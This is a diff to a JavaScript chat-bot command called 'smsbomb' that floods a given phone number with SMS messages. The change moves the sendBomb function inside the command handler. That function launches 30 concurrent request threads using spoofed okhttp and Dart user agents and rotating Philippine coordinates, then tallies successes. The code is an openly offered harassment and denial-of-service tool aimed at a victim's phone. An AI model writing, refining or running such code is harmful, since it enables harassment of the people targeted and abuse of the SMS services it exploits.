@@ -3,7 +3,7 @@ const random = require('random');
 
 module.exports.config = {
   name: "smsbomb",
-  version: "1.0.0",
+  version: "2.1.0",
   role: 2, // Bot owner only for safety
   credits: "selov",
   description: "Send SMS bomb to phone number",
@@ -12,24 +12,26 @@ module.exports.config = {
   cooldowns: 30
 };
 
-async function sendBomb(phone, threads = 30) {
-  const coordinates = [
-    { lat: '14.5995', long: '120.9842' },
-    { lat: '14.6760', long: '121.0437' },
-    { lat: '14.8648', long: '121.0418' }
-  ];
+// Define the sendBomb function INSIDE the run function
+module.exports.run = async function ({ api, event, args }) {
+  const { threadID, messageID, senderID } = event;
 
-  const userAgents = [
-    'okhttp/4.12.0',
-    'okhttp/4.9.2',
-    'Dart/3.6 (dart:io)'
-  ];
+  // Define sendBomb inside run - this is the proper way
+  const sendBomb = async (phone, threads = 30) => {
+    const coordinates = [
+      { lat: '14.5995', long: '120.9842' },
+      { lat: '14.6760', long: '121.0437' },
+      { lat: '14.8648', long: '121.0418' }
+    ];
 
-  return new Promise((resolve, reject) => {
+    const userAgents = [
+      'okhttp/4.12.0',
+      'okhttp/4.9.2',
+      'Dart/3.6 (dart:io)'
+    ];
+
     let successes = 0;
     let failures = 0;
-    let completed = 0;
-    const totalThreads = threads;
 
     const bombSingleThread = async () => {
       try {
@@ -59,35 +61,30 @@ async function sendBomb(phone, threads = 30) {
         successes++;
       } catch (err) {
         failures++;
-      } finally {
-        completed++;
       }
     };
 
-    // Create an array of promises
+    // Create array of promises
     const promises = [];
     for (let i = 0; i < threads; i++) {
       promises.push(bombSingleThread());
     }
 
-    // Wait for all promises to settle
-    Promise.allSettled(promises)
-      .then(() => {
-        resolve({
-          phone: phone,
-          threads: totalThreads,
-          successes: successes,
-          failures: failures,
-          successRate: totalThreads > 0 ? ((successes / totalThreads) * 100).toFixed(2) : "0.00"
-        });
-      })
-      .catch(reject);
-  });
-}
+    // Wait for all to complete
+    await Promise.allSettled(promises);
 
-module.exports.run = async function ({ api, event, args }) {
-  const { threadID, messageID, senderID } = event;
+    const successRate = threads > 0 ? ((successes / threads) * 100).toFixed(2) : "0.00";
 
+    return {
+      phone: phone,
+      threads: threads,
+      successes: successes,
+      failures: failures,
+      successRate: successRate
+    };
+  };
+
+  // Main command logic
   try {
     // Parse arguments
     const phone = args[0];
